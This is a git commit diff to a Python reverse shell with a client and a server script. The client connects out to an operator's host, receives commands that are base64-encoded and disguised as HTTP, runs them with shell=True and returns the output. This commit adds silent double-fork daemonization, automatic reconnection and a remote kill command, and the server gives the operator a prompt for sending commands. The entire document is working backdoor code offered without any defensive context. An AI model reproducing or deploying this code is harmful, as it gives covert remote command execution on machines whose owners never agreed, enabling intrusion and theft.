06909f4b418475711b3df4c7653c40ae881c8c1c
pangdoh <pang_doh@163.com>
2019-09-18 10:02:44 +0800

    1

--- shell/client.py
+++ shell/client.py
@@ -1,27 +1,67 @@
 # -*- coding: utf-8 -*-
-import base64
 import argparse
+import atexit
+import base64
+import os
 import socket
 import subprocess
 import sys
 import time
 
-def connection(host, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host,int(port)))
-    while True:
-        data = s.recv(4096)
-        try:
-            data = decryption_req(data).decode()
-            comRst = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            m_stdout, m_stderr = comRst.communicate()
-            rst = m_stdout.decode(sys.getfilesystemencoding()).encode()
-            s.send(encryption_req(rst))
-        except Exception as e:
-            s.send(encryption_req(str(e).encode()))
 
-        time.sleep(1)
-    s.close()
+# 进行连接
+def connection(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, int(port)))
+        print("已连接。。。。")
+        while True:
+            data = s.recv(4096)
+            try:
+                data = decryption_res(data).decode()
+                if data == '\\!shutdown':
+                    print('接收到终止进程的指令')
+                    sys.exit(0)
+                comRst = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE)
+                m_stdout, m_stderr = comRst.communicate()
+                rst = m_stdout.decode(sys.getfilesystemencoding()).encode()
+                s.send(encryption_req(rst))
+            except Exception as e:
+                s.send(encryption_req(str(e).encode()))
+
+            time.sleep(1)
+        s.close()
+    except Exception as e:
+        print(e)
+
+
+# 守护进程
+def daemonize(pid_file=None, **kwargs):
+    pid = os.fork()
+    if pid:
+        sys.exit(0)
+    os.chdir('/')
+    os.umask(0)
+    os.setsid()
+
+    _pid = os.fork()
+    if _pid:
+        sys.exit(0)
+
+    sys.stdout.flush()
+    sys.stderr.flush()
+    with open('/dev/null') as read_null, open('/dev/null', 'w') as write_null:
+        os.dup2(read_null.fileno(), sys.stdin.fileno())
+        os.dup2(write_null.fileno(), sys.stdout.fileno())
+        os.dup2(write_null.fileno(), sys.stderr.fileno())
+    if pid_file:
+        with open(pid_file, 'w+') as f:
+            f.write(str(os.getpid()))
+    atexit.register(os.remove, pid_file)
+
+    connection(kwargs.get('host'), kwargs.get('port'))
+
 
 # 加密
 def encryption_req(data):
@@ -52,28 +92,60 @@ def encryption_req(data):
     sendData += "\r\n"
     return sendData.encode()
 
+
 # 解密
-def decryption_req(data):
+def decryption_res(data):
     data = data.decode()
     data = data[data.find("Connection: keep-alive\r\n\r\n") + 26:]
     data = str(base64.b64decode(data), "utf-8")
     return data.encode()
 
-    # 解码/解密
-    result = str(base64.b64decode(result), "utf-8")
 
 if __name__ == '__main__':
     # 命令行参数解析对象
     parser = argparse.ArgumentParser()
-    parser.add_argument('-host',dest='hostName',help='Host Name')
-    parser.add_argument('-port',dest='conPort',help='Host Port')
+    parser.add_argument('-host', dest='hostName', help='Host Name')
+    parser.add_argument('-port', dest='conPort', help='Host Port')
+    parser.add_argument('-always', dest='always', type=int, nargs='?', default=False, help='Set the reconnection interval (s).)')
+    parser.add_argument('--daemon', nargs='?', default=False, help='Daemon Start')
     # 解析命令行参数
     args = parser.parse_args()
     host = args.hostName
     port = args.conPort
+    always = args.always
+    daemon = args.daemon
 
     if host == None or port == None:
+        print('Required parameters: -host, -port.')
+        print('必须参数：-host、-port。')
         print(parser.parse_args(['-h']))
         exit(0)
 
-    connection(host, port)
+    # 定义连接次数
+    global conntimes
+    conntimes = 0
+
+    while True:
+        conntimes += 1
+        if daemon != False:
+            # 守护进程启动
+            import platform
+            import re
+
+            if re.search('Windows', platform.system(), re.IGNORECASE):
+                if conntimes == 1:
+                    print('Windows system does not support daemon startup for the time being, and has switched to non-daemon mode.')
+                    print('Windows系统暂不支持守护进程启动，已切换为非守护进程方式。')
+                connection(host, port)
+            else:
+                daemonize(host=host, port=port)
+        else:
+            connection(host, port)
+
+        if always != False and always > 0:
+            if always is None:
+                always = 10
+            print("%d秒后尝试重新连接(%d)..." % (always, conntimes))
+            time.sleep(always)
+        else:
+            break
--- shell/server.py
+++ shell/server.py
@@ -8,15 +8,22 @@ def connection(s):
     print('Waiting for connection......')
     ss, addr = s.accept()
     print('client %s is connection!' % (addr[0]))
-    print('print:\\!q for Disconnect')
+    print('print:\\!q for Disconnect  and  print:\\!shutdown for Kill the target process')
     while True:
-        cmd = input(str(addr[0]) + ':~#')
+        cmd = input(str(addr[0]) + ':#')
         if cmd == '\\!q':
             print('-- Disconnected --')
             exit(0)
+        elif cmd == '\\!shutdown':
+            print('Are you sure you\'re killing the target process? (Y/N)')
+            tmp_cmd = input('>')
+            if tmp_cmd.upper() == 'Y':
+                print("Terminated target process.\r\n已终止目标进程。")
+            else:
+                continue
         ss.send(encryption_res(cmd.encode()))
         data = ss.recv(4096)
-        print(decryption_req(data).decode())
+        print(decryption_req(data).decode(), end='')
 
 def encryption_res(data):
     # 可以采用任何加密或编码方式
@@ -49,7 +56,7 @@ if __name__ == '__main__':
     # 命令行参数解析对象
     parser = argparse.ArgumentParser()
     parser.add_argument('-host', dest='hostName', default='0.0.0.0', help='Host Name(default=0.0.0.0)')
-    parser.add_argument('-port', dest='conPort', default=1234,help='Host Port(default=1234)')
+    parser.add_argument('-port', dest='conPort', default=1234, help='Host Port(default=1234)')
     # 解析命令行参数
     args = parser.parse_args()
     host = args.hostName
